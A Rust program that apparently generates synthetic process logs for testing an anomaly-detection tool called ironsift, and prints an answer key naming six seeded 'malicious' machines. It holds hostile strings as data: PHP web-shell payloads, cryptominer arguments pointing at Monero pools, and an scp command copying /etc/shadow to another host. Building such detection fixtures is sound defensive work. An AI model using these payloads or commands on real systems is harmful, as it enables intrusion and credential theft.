use std::error::Error;
use std::fs::File;
use std::io::Write;
use std::env;
use rand::Rng;
use chrono::{Utc, Duration};

use ironsift::RawLogEntry;

const NUM_MACHINES: u32 = 20;
const LOGS_PER_MACHINE: u32 = 100;

enum OutputFormat {
    Csv,
    Json,
}

fn print_usage() {
    println!("Usage: generator [OPTIONS]");
    println!();
    println!("Options:");
    println!("  --json    Generate JSON output (test_dataset.json)");
    println!("  --csv     Generate CSV output (test_dataset.csv) [default]");
    println!("  --help    Show this help message");
    println!();
    println!("Examples:");
    println!("  generator           # Generate CSV (default)");
    println!("  generator --json    # Generate JSON");
    println!("  generator --csv     # Generate CSV (explicit)");
}

fn main() -> Result<(), Box<dyn Error>> {
    let args: Vec<String> = env::args().collect();
    
    // Parse arguments
    let mut format = OutputFormat::Csv;
    
    for arg in args.iter().skip(1) {
        match arg.as_str() {
            "--json" => format = OutputFormat::Json,
            "--csv" => format = OutputFormat::Csv,
            "--help" => {
                print_usage();
                return Ok(());
            }
            other => {
                eprintln!("Unknown option: {}", other);
                print_usage();
                return Err("Invalid argument".into());
            }
        }
    }
    
    let output_file = match format {
        OutputFormat::Csv => "test_dataset.csv",
        OutputFormat::Json => "test_dataset.json",
    };
    
    let format_name = match format {
        OutputFormat::Csv => "CSV",
        OutputFormat::Json => "JSON",
    };
    
    println!("{:=^60}", " IRONSIFT DATA GENERATOR ");
    println!();
    println!("Format: {}", format_name);
    println!("Generating {} logs for {} machines...", 
        NUM_MACHINES * LOGS_PER_MACHINE, NUM_MACHINES);
    println!("Output: {}", output_file);
    println!();
    
    // Generate all log entries
    let entries = generate_log_entries()?;
    
    // Write in the requested format
    match format {
        OutputFormat::Csv => write_csv(&entries, output_file)?,
        OutputFormat::Json => write_json(&entries, output_file)?,
    }
    
    println!();
    println!("✅ Done! Dataset written to '{}'", output_file);
    println!("   {} machines, {} total process logs", NUM_MACHINES, entries.len());
    println!();
    print_detection_instructions(output_file);
    
    Ok(())
}

fn generate_log_entries() -> Result<Vec<RawLogEntry>, Box<dyn Error>> {
    let mut rng = rand::thread_rng();
    let mut entries = Vec::new();
    
    // Start time: 7 days ago
    let mut current_time = Utc::now() - Duration::days(7);

    // Define normal processes
    let normal_processes = vec![
        ("nginx", 100, "/usr/sbin/nginx", "-c /etc/nginx/nginx.conf", 33),
        ("sshd", 101, "/usr/sbin/sshd", "-D", 0),
        ("postgres", 102, "/usr/lib/postgresql/14/bin/postgres", "-D /var/lib/postgresql/data", 70),
        ("node", 103, "/usr/bin/node", "server.js", 1000),
        ("python3", 104, "/usr/bin/python3", "app.py", 1000),
        ("cron", 105, "/usr/sbin/cron", "-f", 0),
        ("dockerd", 106, "/usr/bin/dockerd", "-H fd://", 0),
        ("redis-server", 107, "/usr/bin/redis-server", "/etc/redis/redis.conf", 999),
        ("apache2", 108, "/usr/sbin/apache2", "-k start", 33),
        ("mysqld", 109, "/usr/sbin/mysqld", "--defaults-file=/etc/mysql/my.cnf", 999),
    ];

    // Attack scenarios
    let miner_processes = [
        ("kworker", "/tmp/.X11-unix/kworker", "--url stratum+tcp://pool.minexmr.com:4444", 0),
        ("systemd", "/var/tmp/.cache/systemd", "--donate-level 1 -o pool.supportxmr.com:3333", 0),
        ("[kthreadd]", "/dev/shm/.config/worker", "-o xmr-eu1.nanopool.org:14444", 0),
    ];
    
    let web_shell_payloads = [
        "eval(base64_decode('aGVsbG8gd29ybGQ='));",
        "system($_GET['cmd']);",
        "<?php @eval($_POST['x']);?>",
    ];
    
    let privesc_processes = [
        ("node", "/home/appuser/.npm/node", "exploit.js", 0),
        ("python3", "/tmp/setup.py", "install", 0),
        ("bash", "/home/ubuntu/.bashrc.d/init", "", 0),
    ];
    
    let lateral_movement = [
        ("ssh", "/usr/bin/ssh", "-o StrictHostKeyChecking=no root@10.0.1.5", 0),
        ("scp", "/usr/bin/scp", "-r /etc/shadow user@192.168.1.100:/tmp", 0),
    ];

    println!("Scenario Overview:");
    println!("  🔹 14 clean machines (normal operations)");
    println!("  🔸 2 cryptominers (machine_003, machine_017)");
    println!("  🔸 1 web shell (machine_009)");
    println!("  🔸 2 privilege escalation (machine_006, machine_015)");
    println!("  🔸 1 lateral movement (machine_012)");
    println!();
    println!("Malicious Machines Summary:");
    println!("  • machine_003: Cryptominer in /tmp/.X11-unix/kworker");
    println!("  • machine_006: Privilege escalation (node running as root)");
    println!("  • machine_009: Web shell (php-fpm with eval payloads)");
    println!("  • machine_012: Lateral movement (SSH to internal IPs)");
    println!("  • machine_015: Privilege escalation (python3 in /tmp)");
    println!("  • machine_017: Cryptominer in /dev/shm/.config/worker");
    println!();

    for i in 0..NUM_MACHINES {
        let machine_id = format!("machine_{:03}", i);
        
        if i % 10 == 0 {
            println!("📊 Processing batch: {}...", machine_id);
        }

        // Always create systemd as PID 1
        entries.push(RawLogEntry {
            machine_id: machine_id.clone(),
            pid: 1,
            ppid: 0,
            name: "systemd".to_string(),
            uid: 0,
            path: "/usr/lib/systemd/systemd".to_string(),
            args: "--system".to_string(),
            timestamp: Some(current_time.to_rfc3339()),
        });

        for log_idx in 0..LOGS_PER_MACHINE {
            current_time = current_time + Duration::seconds(rng.gen_range(60..300));
            let timestamp = current_time.to_rfc3339();
            
            let template = normal_processes[rng.gen_range(0..normal_processes.len())];
            let (mut name, base_pid, mut path, args_ref, mut uid) = template;
            let mut args = args_ref.to_string();
            let pid = base_pid + log_idx;
            let mut ppid = 1;

            // Inject attack scenarios
            
            // Cryptominers (Machines 3, 17)
            if (i == 3 || i == 17) && rng.gen_bool(0.15) {
                let miner = miner_processes[rng.gen_range(0..miner_processes.len())];
                name = miner.0;
                path = miner.1;
                args = miner.2.to_string();
                uid = miner.3;
                ppid = 1;
            }

            // Web Shells (Machine 9)
            if i == 9 && name == "apache2" && rng.gen_bool(0.10) {
                name = "php-fpm";
                ppid = 108;
                args = web_shell_payloads[rng.gen_range(0..web_shell_payloads.len())].to_string();
            }

            // Privilege Escalation (Machines 6, 15)
            if (i == 6 || i == 15) && rng.gen_bool(0.12) {
                let privesc = privesc_processes[rng.gen_range(0..privesc_processes.len())];
                name = privesc.0;
                path = privesc.1;
                args = privesc.2.to_string();
                uid = privesc.3;
                ppid = 103;
            }

            // Lateral Movement (Machine 12)
            if i == 12 && rng.gen_bool(0.10) {
                let lateral = lateral_movement[rng.gen_range(0..lateral_movement.len())];
                name = lateral.0;
                path = lateral.1;
                args = lateral.2.to_string();
                uid = lateral.3;
                ppid = 101;
            }

            if rng.gen_bool(0.05) {
                args = format!("{} --debug", args);
            }

            entries.push(RawLogEntry {
                machine_id: machine_id.clone(),
                pid,
                ppid,
                name: name.to_string(),
                uid,
                path: path.to_string(),
                args,
                timestamp: Some(timestamp),
            });
        }
    }

    Ok(entries)
}

fn write_csv(entries: &[RawLogEntry], path: &str) -> Result<(), Box<dyn Error>> {
    let file = File::create(path)?;
    let mut wtr = csv::Writer::from_writer(file);
    
    for entry in entries {
        wtr.serialize(entry)?;
    }
    
    wtr.flush()?;
    Ok(())
}

fn write_json(entries: &[RawLogEntry], path: &str) -> Result<(), Box<dyn Error>> {
    let mut file = File::create(path)?;
    
    writeln!(file, "[")?;
    
    for (i, entry) in entries.iter().enumerate() {
        if i > 0 {
            writeln!(file, ",")?;
        }
        
        write!(file, r#"  {{"machine_id": "{}", "pid": {}, "ppid": {}, "name": "{}", "uid": {}, "path": "{}", "args": "{}", "timestamp": "{}"}}"#,
            entry.machine_id,
            entry.pid,
            entry.ppid,
            entry.name,
            entry.uid,
            entry.path,
            entry.args.replace('"', "\\\""),
            entry.timestamp.as_ref().unwrap_or(&"".to_string())
        )?;
    }
    
    writeln!(file)?;
    writeln!(file, "]")?;
    
    Ok(())
}

fn print_detection_instructions(output_file: &str) {
    println!("{:=^80}", " DETECTION INSTRUCTIONS ");
    println!();
    println!("🎯 RECOMMENDED PARAMETERS FOR OPTIMAL DETECTION:");
    println!();
    println!("1. DEFAULT DETECTION (Good starting point):");
    println!("   cargo run --bin ironsift -- --input {}", output_file);
    println!();
    println!("2. SENSITIVE DETECTION (Catches more anomalies):");
    println!("   cargo run --bin ironsift -- --input {} --tolerance 0.05", output_file);
    println!("   • Lower tolerance = stricter clustering = more anomalies detected");
    println!("   • Should detect all 6 malicious machines");
    println!();
    println!("3. VERY SENSITIVE (May have false positives):");
    println!("   cargo run --bin ironsift -- --input {} --tolerance 0.03", output_file);
    println!("   • Very strict detection");
    println!("   • May flag some normal variations as anomalies");
    println!();
    println!("4. WITH JSON EXPORT:");
    println!("   cargo run --bin ironsift -- --input {} --tolerance 0.05 --export-json", output_file);
    println!("   • Creates detailed forensic report: forensic_report.json");
    println!();
    println!("{:-^80}", "");
    println!();
    println!("📊 EXPECTED RESULTS:");
    println!("   With --tolerance 0.05, you should detect:");
    println!("   ⚠️  machine_003 (cryptominer in /tmp)");
    println!("   ⚠️  machine_006 (privilege escalation - node as root)");
    println!("   ⚠️  machine_009 (web shell - php eval payloads)");
    println!("   ⚠️  machine_012 (lateral movement - SSH activity)");
    println!("   ⚠️  machine_015 (privilege escalation - python3 in /tmp)");
    println!("   ⚠️  machine_017 (cryptominer in /dev/shm)");
    println!();
    println!("💡 TIPS:");
    println!("   • Start with default, then lower tolerance if needed");
    println!("   • Check 'Attack Pattern Categorization' in output");
    println!("   • Export JSON for detailed forensic analysis");
    println!("   • Edit ironsift_config.json to customize detection");
    println!();
}